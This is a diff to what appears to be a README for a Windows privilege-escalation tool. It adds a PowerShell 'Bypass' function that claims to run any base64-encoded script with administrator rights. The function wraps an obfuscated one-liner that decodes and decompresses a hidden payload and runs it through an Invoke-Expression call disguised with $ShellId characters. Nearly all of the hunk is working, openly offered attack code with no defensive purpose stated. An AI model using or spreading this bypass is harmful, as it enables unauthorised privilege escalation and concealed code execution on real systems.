@@ -42,6 +42,26 @@ in your C: directory just to show you it works.
 (New-OBJEct SYsTEm.IO.StReamREADer( (New-OBJEct  iO.COmpREssioN.dEflAtEstrEam([SYStEm.Io.mEMoRYStREAm] [CoNVERT]::fROmBAse64STrING( 'hY6xCsIwFEV/5RG6ph0ci1MHBZEOQacsobmtQtKEvEj9fJuC4FT3e849VX89HUUMCxI/4FyNN0hiHqgaggWJNmEiYy2J86W7aRXGvJgE3TnDDNZ18JNWBdV9xKyH4L2ZraDGUrXKqRn/KTxLRs7PeWLdvdIdaaNFUYvCj8GuBxGp1LUqm5SlckAkyXTY9BYOGbuR4puyv/2t2ZAP'),[sySteM.iO.COmPREsSion.COMprEssIONmODe]::decOMpreSS ) ) , [tExt.eNcODINg]::ascIi)).rEAdToEND( )|& ( $SHELLId[1]+$ShELLid[13]+'X')
 ```
 
+I have turned this bypass into a function as well. 
+
+Using the following syntax you can run any Base64 encoded script as an Admin:
+
+```
+Bypass TgBlAHcALQBJAHQAZQBtACAAQwA6AFwASQB0AC0AVwBvAHIAawBlAGQALgB0AHgAdAA=
+```
+
+```
+function Bypass {
+[CmdletBinding()]
+param (
+[Parameter (Position=0, Mandatory = $True)]
+[string]$code )
+
+(New-OBJEct SYsTEm.IO.StReamREADer( (New-OBJEct  iO.COmpREssioN.dEflAtEstrEam([SYStEm.Io.mEMoRYStREAm] [CoNVERT]::fROmBAse64STrING( 'hY6xCsIwFEV/5RG6ph0ci1MHBZEOQacsobmtQtKEvEj9fJuC4FT3e849VX89HUUMCxI/4FyNN0hiHqgaggWJNmEiYy2J86W7aRXGvJgE3TnDDNZ18JNWBdV9xKyH4L2ZraDGUrXKqRn/KTxLRs7PeWLdvdIdaaNFUYvCj8GuBxGp1LUqm5SlckAkyXTY9BYOGbuR4puyv/2t2ZAP'),[sySteM.iO.COmPREsSion.COMprEssIONmODe]::decOMpreSS ) ) , [tExt.eNcODINg]::ascIi)).rEAdToEND( )|& ( $SHELLId[1]+$ShELLid[13]+'X')
+}
+``` 
+
+
 <p align="right">(<a href="#top">back to top</a>)</p>
 
 
